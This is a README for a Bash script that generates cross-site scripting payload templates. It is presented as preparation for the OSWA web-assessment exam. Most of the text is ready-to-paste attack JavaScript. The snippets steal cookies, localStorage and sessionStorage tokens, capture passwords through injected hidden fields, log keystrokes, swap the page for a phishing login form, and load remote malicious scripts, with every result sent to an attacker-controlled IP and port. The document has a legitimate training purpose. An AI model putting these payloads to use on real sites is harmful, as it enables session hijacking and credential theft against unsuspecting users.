
# XSS-Template

`xss_template.sh` is a Bash script designed to streamline XSS payload generation while preparing for the Offensive Security Web Assessor (OSWA) exam. This tool helps you quickly create common XSS exploit templates using your own IP, port, and hosted malicious files.

---

## Overview

This tool was developed with speed, simplicity, and utility in mind. Instead of writing XSS payloads manually, this script generates pre-configured code snippets for different attack vectors including cookie theft, keylogging, phishing, and more.

---

## Features

- Interactive prompt for IP, Port, and hosted File name
- Outputs a file with templated JavaScript snippets
- Payloads cover a variety of XSS use cases
- Easily copy/paste-ready for lab or exam usage
- Supports both reflected and stored XSS scenarios

---

## Usage

Make the script executable and run:

```bash
chmod +x xss_template.sh
./xss_template.sh
````

You'll be prompted to enter:

* **IP Address** – Your attacker box (e.g., `10.10.14.5`)
* **Port** – Where your listener/server is running (optional)
* **File Name** – JavaScript file to be loaded (optional)

The script will generate an output file:

```
xxs_<IP>.txt
```

This file contains all the payloads, pre-filled with your IP, Port, and optional file reference.

---

## Template Categories

The following templates are generated:

### 1. **Steal Session Cookies**

```javascript
let cookie = document.cookie;
let encodedCookie = encodeURIComponent(cookie);
fetch("http://<IP>:<PORT>/exfil?data=" + encodedCookie);
```

### 2. **Steal Local Storage Tokens**

```javascript
fetch('http://<IP>:<PORT>/session?' + encodeURIComponent(localStorage.token));
```

### 3. **Steal Session Passwords**

Creates hidden input fields and exfiltrates entered data:

```javascript
let body = document.body;
let u = document.createElement('input');
u.type = 'text';
u.style.position = 'fixed';
let p = document.createElement('input');
p.type = 'password';
p.style.position = 'fixed';
body.append(u);
body.append(p);
setTimeout(function() {
    fetch('http://<IP>:<PORT>/k?u=' + u.value + '&p=' + p.value)
}, 5000);
```

### 4. **Steal Local Storage / Session Storage**

```javascript
let data = JSON.stringify(localStorage); // or sessionStorage
let encodedData = encodeURIComponent(data);
fetch("http://<IP>:<PORT>/exfil?data=" + encodedData);
```

### 5. **Cookie Exfiltration via `document.write`**

```html
<script>document.write('<img src="http://<IP>:<PORT>/?bogus=' + document.cookie + '" />');</script>
```

---

## XSS Payload Variants

### Payload 1

```html
<img src='x' onerror='src="http://<IP>:<PORT>/<FILE>"'>
```

### Payload 2

```html
<img src='x' onerror='const script = document.createElement("script"); script.src="http://<IP>:<PORT>/<FILE>"; script.async = true; document.body.appendChild(script);'>
```

### Payload 3

```html
<script src="http://<IP>:<PORT>/<FILE>"></script>
```

### Payload 4

```html
<img src=x onerror='fetch("http://<IP>:<PORT>/<FILE>")'>
```

---

## Keylogger

```javascript
function logKey(event) {
  fetch("http://<IP>:<PORT>/k?key=" + event.key);
}
document.addEventListener('keydown', logKey);
```

---

## Phishing Template

```javascript
fetch('/search/login').then(res => res.text().then(data => {
  document.documentElement.innerHTML = data;
  document.forms[0].action = 'http://<IP>';
  document.forms[0].method = 'get';
}));
```

---

## Output Example

Output is saved as:

```
xxs_10.10.14.5.txt
```

You can open the file and copy any payload with your inputs pre-filled.

---

## Screenshot

![image](https://github.com/user-attachments/assets/63d1716f-2722-4bbb-a015-4b6e948fcb02)

---

## Requirements

* Bash
* A listener or HTTP server (e.g., Python `http.server`) running at the specified IP and port
* A hosted malicious JS file (optional but recommended for some payloads)

---

## Disclaimer

This script is for educational and authorized penetration testing use only. Unauthorized use against systems without permission is illegal and unethical.

